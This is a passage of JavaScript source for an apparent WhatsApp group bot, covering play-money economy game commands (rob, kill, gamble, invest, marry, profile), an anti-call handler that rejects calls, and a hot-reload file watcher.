            text: `❌ *ROBBERY FAILED!*\n\n@${m.sender.split('@')[0]} tried to rob @${target.split('@')[0]} but got caught!\n\n💸 *Fine: -${fmtCoins(fine)} coins*\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`,
            mentions: [m.sender, target]
        }, { quoted: m });
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — KILL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'kill':
case 'assassinate': {
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`🔪 Usage: ${prefix}kill @user`);
    if (target === m.sender) return reply('❌ You can\'t kill yourself! (Please don\'t)');
    
    const acc = ensureEconomy(m.sender);
    const targetAcc = ensureEconomy(target);
    
    // Check if target is already dead/in hospital
    if (targetAcc.hospital && targetAcc.hospitalUntil > Date.now()) {
        return reply(`🏥 @${target.split('@')[0]} is already in the hospital! You can't kill them.`, { mentions: [target] });
    }
    
    const killChance = 0.3; // 30% kill chance
    const damage = Math.floor(targetAcc.wallet * 0.2) + 200;
    
    if (Math.random() < killChance) {
        targetAcc.wallet -= damage;
        targetAcc.hospital = true;
        targetAcc.hospitalUntil = Date.now() + 30 * 60 * 1000; // 30 minutes
        acc.wallet += damage * 0.3; // 30% bounty
        saveDB();
        await empire.sendMessage(m.chat, {
            text: `💀 *ASSASSINATION SUCCESSFUL!*\n\n@${m.sender.split('@')[0]} killed @${target.split('@')[0]}! 💀\n\n💰 *Damage:* -${fmtCoins(damage)} coins\n🩸 *Target sent to hospital for 30 minutes!*\n🤑 *Bounty:* +${fmtCoins(damage * 0.3)} coins`,
            mentions: [m.sender, target]
        }, { quoted: m });
    } else {
        // Failed kill - target fights back
        const counterDamage = Math.floor(acc.wallet * 0.15) + 100;
        acc.wallet -= counterDamage;
        acc.hospital = true;
        acc.hospitalUntil = Date.now() + 15 * 60 * 1000; // 15 minutes
        saveDB();
        await empire.sendMessage(m.chat, {
            text: `💀 *ASSASSINATION FAILED!*\n\n@${m.sender.split('@')[0]} tried to kill @${target.split('@')[0]} but got REKT!\n\n💀 *You were sent to the hospital for 15 minutes!*\n💸 *Damage:* -${fmtCoins(counterDamage)} coins\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`,
            mentions: [m.sender, target]
        }, { quoted: m });
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — ADDPROTECT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'addprotect':
case 'protect': {
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`🛡️ Usage: ${prefix}protect @user`);
    if (target === m.sender) return reply('❌ You can\'t protect yourself. Ask someone else to protect you!');
    
    const acc = ensureEconomy(m.sender);
    const targetAcc = ensureEconomy(target);
    const cost = 1000;
    
    if (acc.wallet < cost) return reply(`❌ You need *${fmtCoins(cost)} coins* to protect someone! You have ${fmtCoins(acc.wallet)} coins.`);
    
    // Check if target already has protection
    if (targetAcc.protected && targetAcc.protectedUntil > Date.now()) {
        return reply(`🛡️ @${target.split('@')[0]} is already protected for ${Math.ceil((targetAcc.protectedUntil - Date.now()) / 60000)} more minutes!`, { mentions: [target] });
    }
    
    acc.wallet -= cost;
    targetAcc.protected = true;
    targetAcc.protectedUntil = Date.now() + 2 * 60 * 60 * 1000; // 2 hours
    targetAcc.protectedBy = m.sender;
    saveDB();
    
    await empire.sendMessage(m.chat, {
        text: `🛡️ *PROTECTION ACTIVATED!*\n\n@${m.sender.split('@')[0]} paid *${fmtCoins(cost)} coins* to protect @${target.split('@')[0]} for 2 hours!\n\n🔒 *They are now safe from robbery and attacks!*`,
        mentions: [m.sender, target]
    }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — HOSPITAL / HEAL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'hospital':
case 'heal': {
    const acc = ensureEconomy(m.sender);
    const cost = 300;
    
    // Check if already in hospital
    if (acc.hospital && acc.hospitalUntil > Date.now()) {
        const remaining = Math.ceil((acc.hospitalUntil - Date.now()) / 60000);
        return reply(`🏥 You're already in the hospital! You need to rest for ${remaining} more minutes.`);
    }
    
    // Check if dead/injured (hospital flag)
    if (!acc.hospital || acc.hospitalUntil < Date.now()) {
        return reply(`💚 You're perfectly healthy! Use ${prefix}kill to attack someone or ${prefix}rob to steal.`);
    }
    
    if (acc.wallet < cost) return reply(`❌ You need *${fmtCoins(cost)} coins* to heal! You have ${fmtCoins(acc.wallet)} coins.`);
    
    acc.wallet -= cost;
    acc.hospital = false;
    acc.hospitalUntil = null;
    saveDB();
    
    reply(`🏥 *HEALING COMPLETE!*\n\n💚 You paid *${fmtCoins(cost)} coins* and are now fully healed!\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — GAMBLE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'gamble': {
    const acc = ensureEconomy(m.sender);
    const bet = parseInt(args[0]);
    if (!bet || bet <= 0) return reply(`🎲 Usage: ${prefix}gamble <amount>\nExample: ${prefix}gamble 500`);
    if (bet > acc.wallet) return reply(`❌ You only have ${fmtCoins(acc.wallet)} coins to gamble.`);
    
    // Check if in hospital
    if (acc.hospital && acc.hospitalUntil > Date.now()) {
        return reply(`🏥 You're in the hospital! Use ${prefix}hospital to heal first.`);
    }
    
    const win = Math.random() < 0.48; // 48% win chance (house edge)
    const multiplier = Math.floor(Math.random() * 2) + 1; // 1x or 2x multiplier (for excitement)
    
    if (win) {
        const winnings = bet * multiplier;
        acc.wallet += winnings;
        saveDB();
        reply(`🎲 *GAMBLE WINNER!*\n\n💰 *Bet:* ${fmtCoins(bet)} coins\n🎰 *Multiplier:* x${multiplier}\n🏆 *Winnings:* +${fmtCoins(winnings)} coins\n\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`);
    } else {
        acc.wallet -= bet;
        saveDB();
        reply(`🎲 *GAMBLE LOST!*\n\n💰 *Bet:* ${fmtCoins(bet)} coins\n💔 *You lost!*\n\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — INVEST
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'invest': {
    const acc = ensureEconomy(m.sender);
    const amount = parseInt(args[0]);
    if (!amount || amount <= 0) return reply(`📈 Usage: ${prefix}invest <amount>\nExample: ${prefix}invest 1000`);
    if (amount > acc.wallet) return reply(`❌ You only have ${fmtCoins(acc.wallet)} coins to invest.`);
    
    const roll = Math.random();
    let result, profit = 0;
    
    if (roll < 0.05) { // 5% chance - triple!
        profit = amount * 3;
        result = '🚀 *MOONSHOT!* Your investment tripled!';
    } else if (roll < 0.25) { // 20% chance - double!
        profit = amount * 2;
        result = '📈 *GREAT INVESTMENT!* Your investment doubled!';
    } else if (roll < 0.55) { // 30% chance - small profit
        profit = Math.floor(amount * (1 + Math.random() * 0.3));
        result = '📊 *MODEST RETURN!* Your investment grew slightly.';
    } else { // 45% chance - loss
        profit = Math.floor(amount * (0.1 + Math.random() * 0.5));
        result = '📉 *BAD INVESTMENT!* You lost part of your investment.';
    }
    
    acc.wallet += profit - amount;
    saveDB();
    
    reply(`📈━━━━━[ INVESTMENT ]━━━━━📈\n\n💰 *Invested:* ${fmtCoins(amount)} coins\n${result}\n💵 *Return:* ${fmtCoins(profit)} coins\n📊 *Net:* ${profit - amount > 0 ? '+' : ''}${fmtCoins(profit - amount)} coins\n\n👛 *Balance:* ${fmtCoins(acc.wallet)} coins`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — MARRY / DIVORCE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'marry': {
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`💍 Usage: ${prefix}marry @user`);
    if (target === m.sender) return reply('❌ You can\'t marry yourself!');
    
    const acc = ensureEconomy(m.sender);
    const targetAcc = ensureEconomy(target);
    const cost = 5000;
    
    if (acc.wallet < cost) return reply(`❌ You need *${fmtCoins(cost)} coins* to get married! You have ${fmtCoins(acc.wallet)} coins.`);
    
    // Check if already married
    if (acc.spouse) return reply(`💔 You're already married to @${acc.spouse.split('@')[0]}! Use ${prefix}divorce to break up.`);
    if (targetAcc.spouse) return reply(`💔 @${target.split('@')[0]} is already married!`);
    
    acc.wallet -= cost;
    acc.spouse = target;
    targetAcc.spouse = m.sender;
    saveDB();
    
    await empire.sendMessage(m.chat, {
        text: `💍 *MARRIAGE CONFIRMED!*\n\n💕 @${m.sender.split('@')[0]} and @${target.split('@')[0]} are now married!\n💎 *Cost:* ${fmtCoins(cost)} coins\n\n🎉 *Congratulations!* May your love never die... or get robbed.`,
        mentions: [m.sender, target]
    }, { quoted: m });
    break;
}

case 'divorce': {
    const acc = ensureEconomy(m.sender);
    if (!acc.spouse) return reply(`💔 You're not married! Use ${prefix}marry @user to find love.`);
    
    const spouse = acc.spouse;
    const spouseAcc = ensureEconomy(spouse);
    const fee = Math.floor(acc.wallet * 0.5);
    
    acc.wallet -= fee;
    delete acc.spouse;
    delete spouseAcc.spouse;
    saveDB();
    
    reply(`💔 *DIVORCE COMPLETE!*\n\n💸 *You lost:* ${fmtCoins(fee)} coins (50% of your wealth)\n🔁 *You are now single.*\n\n💔 *Love is dead. Long live the economy.*`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — PROFILE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'profile':
case 'stats': {
    const target = m.mentionedJid?.[0] || m.sender;
    const acc = ensureEconomy(target);
    const name = target === m.sender ? 'You' : `@${target.split('@')[0]}`;
    
    const level = Math.floor((acc.wallet + acc.bank) / 5000) + 1;
    const isProtected = acc.protected && acc.protectedUntil > Date.now();
    const isInHospital = acc.hospital && acc.hospitalUntil > Date.now();
    const spouse = acc.spouse ? `@${acc.spouse.split('@')[0]}` : '💔 Single';
    const jailCount = acc.jailCount || 0;
    
    const profileText = 
`📋━━━━━[ USER PROFILE ]━━━━━📋

👤 *Name:* ${name}
💰 *Wallet:* ${fmtCoins(acc.wallet)} coins
🏦 *Bank:* ${fmtCoins(acc.bank)} coins
💎 *Total:* ${fmtCoins(acc.wallet + acc.bank)} coins
📈 *Level:* ${level}

💍 *Spouse:* ${spouse}
🛡️ *Protected:* ${isProtected ? '✅ Yes' : '❌ No'}
🏥 *Hospital:* ${isInHospital ? `✅ (${Math.ceil((acc.hospitalUntil - Date.now()) / 60000)} min left)` : '❌ Healthy'}
👮 *Jail Count:* ${jailCount}/3
📦 *Inventory:* ${acc.inventory?.length || 0} items

📋━━━━━━━━━━━━━━━━━━━━━━━`;
    
    const mentions = target === m.sender ? [m.sender] : [m.sender, target];
    await empire.sendMessage(m.chat, { text: profileText, mentions }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — RICH (Alias for leaderboard)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'rich':
case 'wealth': {
    // Re-use leaderboard but with different title
    const entries = Object.entries(db.economy)
        .map(([id, acc]) => ({ id, total: acc.wallet + acc.bank }))
        .sort((a, b) => b.total - a.total)
        .slice(0, 15);
    if (!entries.length) return reply('📊 No economy data yet.');
    const list = entries.map((e, i) => `${i + 1}. @${e.id.split('@')[0]} — ${fmtCoins(e.total)} coins`).join('\n');
    await empire.sendMessage(m.chat, {
        text: `💰━━━━━[ RICH LIST ]━━━━━💰\n\n${list}\n\n💰━━━━━━━━━━━━━━━━━━💰`,
        mentions: entries.map(e => e.id)
    }, { quoted: m });
    break;
}

default:
                break;
        }

    } catch (err) {
        console.error('Command error:', err);
        if (m?.chat) empire.sendMessage(m.chat, { text: `❌ Error: ${err.message}` }).catch(() => {});
    }
}

// ========== GROUP PARTICIPANTS UPDATE ==========
const originalGroupParticipantsUpdate = empire.groupParticipantsUpdate;
empire.groupParticipantsUpdate = async function (update) {
    try {
        const result = await originalGroupParticipantsUpdate?.apply(this, arguments);
        if (update?.id && update?.participants) {
            const gm = await this.groupMetadata(update.id).catch(() => null);
            await handleGroupParticipantsUpdate(this, update, gm, this.user.id);
        }
        return result;
    } catch (e) { console.error('Group update error:', e); }
};

// ========== ANTI-CALL EXPORT ==========
async function handleAntiCall(empire, callData) {
    try {
        if (!getSetting('global', 'anticall', false)) return false;
        const caller = callData.from;
        if (!caller) return false;
        await empire.rejectCall(callData.id, callData.from).catch(() => {});
        await empire.sendMessage(caller, { text: `📵 *Calls are disabled.*\n\nYour call was rejected. Please use text commands.` }).catch(() => {});
        return true;
    } catch { return false; }
}
module.exports.handleAntiCall = handleAntiCall;

// ========== HOT RELOAD ==========
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file);
    console.log('\x1b[0;32m' + __filename + ' updated!\x1b[0m');
    delete require.cache[file];
    require(file);
});
